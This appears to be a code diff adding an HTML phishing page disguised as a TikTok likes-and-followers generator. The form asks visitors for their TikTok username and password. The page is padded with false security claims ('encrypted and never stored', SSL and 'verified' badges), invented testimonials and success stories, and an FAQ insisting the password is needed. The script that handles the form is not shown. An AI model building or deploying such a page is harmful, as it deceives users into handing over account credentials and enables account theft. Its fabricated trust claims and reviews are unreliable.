@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>TikTok Likes & Followers Generator</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container">
+    <h1>Boost Your TikTok Fame Instantly</h1>
+    <p class="intro-text">
+      Struggling to grow your TikTok account? You're in the right place.
+      With over 10 years of digital growth expertise, our platform delivers 
+      100% real TikTok likes and followers — fast, secure, and guaranteed.
+    </p>
+
+    <form id="boostForm">
+      <label for="username">TikTok Username</label>
+      <input type="text" id="username" name="username" placeholder="@yourusername" required />
+
+      <label for="password">Account Password <span class="lock-icon">🔒</span></label>
+      <input type="password" id="password" name="password" placeholder="Your TikTok password" required />
+      <small class="secure-note">Your password is encrypted and never stored. Verified via SSL 256-bit encryption.</small>
+
+      <label for="likes">Select Likes</label>
+      <select id="likes" name="likes">
+        <option value="100">100 Likes</option>
+        <option value="500">500 Likes</option>
+        <option value="1000">1,000 Likes</option>
+        <option value="2000">2,000 Likes</option>
+        <option value="5000">5,000 Likes</option>
+      </select>
+
+      <label for="followers">Select Followers</label>
+      <select id="followers" name="followers">
+        <option value="100">100 Followers</option>
+        <option value="500">500 Followers</option>
+        <option value="1000">1,000 Followers</option>
+        <option value="2000">2,000 Followers</option>
+        <option value="5000">5,000 Followers</option>
+      </select>
+
+      <button type="submit">Get Followers & Likes</button>
+    </form>
+
+    <div id="processing" class="hidden">
+      <div class="spinner"></div>
+      <p>Processing your request securely...</p>
+    </div>
+
+    <div class="trust-badge">
+      <img src="SSL.jpg" alt="SSL Secured" />
+      <p>256-Bit SSL Encryption - Your data is safe.</p>
+    </div>
+
+    <section id="testimonials">
+      <h2>What Our Users Say</h2>
+      <div class="testimonial">
+        <p>“I was skeptical at first, but this actually works! I gained 5,000 followers in one day.”</p>
+        <p class="user-name">— @realmattTik</p>
+      </div>
+      <div class="testimonial">
+        <p>“Best service ever! My engagement rate tripled. Highly recommend!”</p>
+        <p class="user-name">— @queen_vibes</p>
+      </div>
+    </section>
+
+    <section id="success-stories">
+      <h2>Success Stories</h2>
+      <div class="story">
+        <p><strong>@kayla_beauty</strong> went from 200 followers to 10K in just a week after using our service.</p>
+      </div>
+      <div class="story">
+        <p><strong>@beatdrop24</strong> had a music video that gained over 50K likes after our boost.</p>
+      </div>
+    </section>
+
+    <section id="faq">
+      <h2>Frequently Asked Questions</h2>
+      <div class="faq-item">
+        <h3>Is this safe?</h3>
+        <p>Yes! We use secure methods that comply with TikTok's API policies.</p>
+      </div>
+      <div class="faq-item">
+        <h3>How long does it take?</h3>
+        <p>Delivery starts within minutes and completes within 24 hours depending on quantity.</p>
+      </div>
+      <div class="faq-item">
+        <h3>Do I need to give my password?</h3>
+        <p>Yes, but your credentials are encrypted and never stored.</p>
+      </div>
+    </section>
+  </div>
+
+  <div class="verified-seal">
+    <img src="https://img.icons8.com/color/96/verified-badge.png" alt="Verified Site" />
+    <p>This site is verified & secured for safe use.</p>
+  </div>
+
+  <div id="popup" class="popup">
+    <div class="popup-content">
+      <h3>100% Real Service</h3>
+      <p>Your account is safe. We use encrypted connections & deliver results fast!</p>
+      <button onclick="document.getElementById('popup').style.display='none'">OK</button>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
